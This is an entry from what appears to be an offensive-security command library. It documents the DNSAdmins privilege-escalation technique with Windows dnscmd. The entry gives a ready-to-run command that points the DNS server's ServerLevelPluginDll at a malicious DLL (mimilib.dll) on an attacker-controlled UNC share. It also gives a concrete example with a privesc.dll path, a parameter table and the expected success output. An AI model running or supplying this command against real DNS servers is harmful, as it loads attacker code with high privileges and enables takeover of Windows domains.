---
id: c5b58561-1382-4946-9220-34be33252a1b
name: Configure-DNS-DLL-Path-RSAT
type: command
executor: powershell
data: >-
  dnscmd <servername> /config /serverlevelplugindll
  \\attacker_IP\dll\mimilib.dll
output: null
created_at: '2023-04-06T03:56:06.474870+00:00'
updated_at: '2023-10-10T20:26:10.325254+00:00'
platforms:
  - Windows
tags:
  - dns
  - hijacking
verified: true
validated: true
---

# Configure-DNS-DLL-Path-RSAT

## Command

```powershell
dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
```

## Description

Uses dnscmd from RSAT to set the DNS ServerLevelPluginDll to a malicious path, enabling DLL hijacking when the service loads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| <servername> | Target DNS server name or IP | Yes |
| /config | Configures server settings | Built-in |
| /serverlevelplugindll | Sets the plugin DLL path | Built-in |
| \\attacker_IP\dll\mimilib.dll | UNC path to malicious DLL | Yes |

## Examples

### Basic Usage

```powershell
dnscmd DC01 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll
```

## Expected Output

```
Command completed successfully.
```

No errors indicate successful registry update.

## Related

- [[procedures/Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation]]
